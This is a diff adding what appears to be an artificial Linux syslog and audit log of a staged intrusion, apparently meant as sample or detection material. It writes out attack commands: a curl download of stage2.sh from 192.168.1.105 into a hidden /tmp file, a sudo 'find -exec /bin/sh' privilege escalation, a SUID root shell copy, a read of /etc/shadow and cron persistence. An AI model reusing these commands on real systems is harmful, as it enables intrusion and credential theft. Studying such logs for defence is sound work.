@@ -1,0 +1,30 @@
+Oct 06 08:12:01 srv-corp-lnx01 systemd[1]: Starting Daily apt download activities...
+Oct 06 08:12:05 srv-corp-lnx01 systemd[1]: apt-daily.service: Deactivated successfully.
+Oct 06 08:15:22 srv-corp-lnx01 sshd[1420]: Server listening on 0.0.0.0 port 22.
+Oct 06 08:35:10 srv-corp-lnx01 sshd[2104]: Failed password for invalid user admin from 192.168.1.105 port 43210 ssh2
+Oct 06 08:35:15 srv-corp-lnx01 sshd[2106]: Failed password for invalid user root from 192.168.1.105 port 43212 ssh2
+Oct 06 08:35:22 srv-corp-lnx01 sshd[2108]: Failed password for invalid user test from 192.168.1.105 port 43214 ssh2
+Oct 06 08:35:30 srv-corp-lnx01 sshd[2110]: Failed password for invalid user service_account from 192.168.1.105 port 43216 ssh2
+Oct 06 08:42:15 srv-corp-lnx01 sshd[2150]: Accepted password for sec_analyst from 192.168.1.105 port 43220 ssh2
+Oct 06 08:42:15 srv-corp-lnx01 sshd[2150]: pam_unix(sshd:session): session opened for user sec_analyst by (uid=0)
+Oct 06 08:42:16 srv-corp-lnx01 systemd-logind[780]: New session 42 of user sec_analyst.
+Oct 06 08:43:02 srv-corp-lnx01 sudo[2189]: sec_analyst : TTY=pts/0 ; PWD=/home/sec_analyst ; USER=root ; COMMAND=/usr/bin/id
+Oct 06 08:43:02 srv-corp-lnx01 sudo[2189]: pam_unix(sudo:session): session opened for user root by sec_analyst(uid=1001)
+Oct 06 08:43:02 srv-corp-lnx01 sudo[2189]: pam_unix(sudo:session): session closed for user root
+Oct 06 08:43:45 srv-corp-lnx01 sudo[2210]: sec_analyst : TTY=pts/0 ; PWD=/home/sec_analyst ; USER=root ; COMMAND=/usr/bin/sudo -l
+Oct 06 08:43:45 srv-corp-lnx01 sudo[2210]: pam_unix(sudo:session): session opened for user root by sec_analyst(uid=1001)
+Oct 06 08:43:45 srv-corp-lnx01 sudo[2210]: pam_unix(sudo:session): session closed for user root
+Oct 06 08:44:30 srv-corp-lnx01 kernel: [ 2450.112040] audit: type=1300 audit(1728204270.112:89): arch=c000003e syscall=59 success=yes exit=0 a0=55f8b910 a1=55f8b980 a2=55f8b9b0 a3=0 items=2 ppid=2155 pid=2240 auid=1001 uid=1001 gid=1001 euid=1001 comm="curl" exe="/usr/bin/curl"
+Oct 06 08:44:31 srv-corp-lnx01 auditd[650]: PROCESS_EXEC: pid=2240 comm="curl" cmdline="curl -s -o /tmp/.cache_updater http://192.168.1.105:8000/stage2.sh" user=sec_analyst
+Oct 06 08:45:12 srv-corp-lnx01 auditd[650]: PROCESS_EXEC: pid=2255 comm="chmod" cmdline="chmod +x /tmp/.cache_updater" user=sec_analyst
+Oct 06 08:46:05 srv-corp-lnx01 sudo[2270]: sec_analyst : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/find / -name test -exec /bin/sh -i ;
+Oct 06 08:46:05 srv-corp-lnx01 sudo[2270]: pam_unix(sudo:session): session opened for user root by sec_analyst(uid=1001)
+Oct 06 08:46:06 srv-corp-lnx01 auditd[650]: PRIV_ESCALATION: uid=1001 transitioned to euid=0 via /usr/bin/find
+Oct 06 08:47:18 srv-corp-lnx01 auditd[650]: PROCESS_EXEC: pid=2285 comm="sh" ppid=2270 cmdline="/bin/sh -i" euid=0 egid=0
+Oct 06 08:48:02 srv-corp-lnx01 sudo[2301]: root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cp /bin/bash /tmp/.rootshell
+Oct 06 08:48:05 srv-corp-lnx01 auditd[650]: FILE_PERM_CHANGE: path="/tmp/.rootshell" mode=4755 suid=true comm="chmod"
+Oct 06 08:49:15 srv-corp-lnx01 auditd[650]: FILE_ACCESS: pid=2320 comm="cat" path="/etc/shadow" uid=0 euid=0 res=success
+Oct 06 08:50:30 srv-corp-lnx01 CRON[2350]: (root) CMD (/bin/bash -c 'test -x /tmp/.cache_updater && /tmp/.cache_updater >/dev/null 2>&1')
+Oct 06 08:52:10 srv-corp-lnx01 sudo[2270]: pam_unix(sudo:session): session closed for user root
+Oct 06 08:52:45 srv-corp-lnx01 sshd[2150]: pam_unix(sshd:session): session closed for user sec_analyst
+Oct 06 08:52:45 srv-corp-lnx01 systemd-logind[780]: Session 42 of user sec_analyst logged out.
